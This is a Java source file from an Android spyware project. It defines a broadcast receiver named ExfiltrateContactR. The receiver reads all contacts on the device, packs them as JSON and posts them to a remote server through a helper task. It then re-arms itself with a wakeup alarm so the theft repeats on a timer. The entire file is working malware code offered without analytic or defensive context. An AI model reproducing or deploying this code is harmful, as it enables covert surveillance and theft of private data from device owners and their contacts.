package android.spyware.receivers;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.spyware.model.Contact;
import android.spyware.utils.Harvester;
import android.spyware.utils.Parameter;
import android.spyware.utils.PostDataAT;
import android.util.Log;

import org.json.JSONArray;

import java.util.ArrayList;
import java.util.Calendar;

import static android.spyware.Spyware.DEV_MODE;
import static android.spyware.Spyware.TAG;
import static android.spyware.Spyware.TIMER;

/**
 * Copyright (C) 2015 Alexandre Teyar
 * <p>
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 * <p>
 * http://www.apache.org/licenses/LICENSE-2.0
 * <p>
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 **/

public class ExfiltrateContactR extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        if (DEV_MODE) {
            Log.i(TAG, ExfiltrateSMSR.class.getName() + "->onReceive:receiver started...");
        }

        Harvester harvester = new Harvester(context);

        ArrayList<Contact> contacts = (ArrayList<Contact>) harvester.getContacts();

        if (contacts != null && !contacts.isEmpty()) {
            JSONArray JSONArrayContacts = new JSONArray();

            for (Contact contact : contacts) { JSONArrayContacts.put(contact.toJSON()); }

            Parameter                           params     = new Parameter("ExfiltrateContact", JSONArrayContacts);
            AsyncTask<Parameter, Void, Integer> postDataAT = new PostDataAT();

            postDataAT.execute(params);
        }

        this.setAlarm(context);
    }

    private void setAlarm(Context context) {
        Calendar calendar = Calendar.getInstance();
        calendar.add(Calendar.MINUTE, TIMER);

        Intent        intent        = new Intent(context, ExfiltrateContactR.class);
        PendingIntent pendingIntent = PendingIntent.getBroadcast(context, 0, intent, PendingIntent.FLAG_ONE_SHOT);

        AlarmManager alarmManager = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
        alarmManager.set(AlarmManager.RTC_WAKEUP, calendar.getTimeInMillis(), pendingIntent);

        if (DEV_MODE) {
            Log.i(TAG, ExfiltrateZombieR.class.getName() + "->setAlarm:" + calendar.get(Calendar.HOUR) + ":"
                       + calendar.get(Calendar.MINUTE) + ":" + calendar.get(Calendar.SECOND));
        }
    }
}
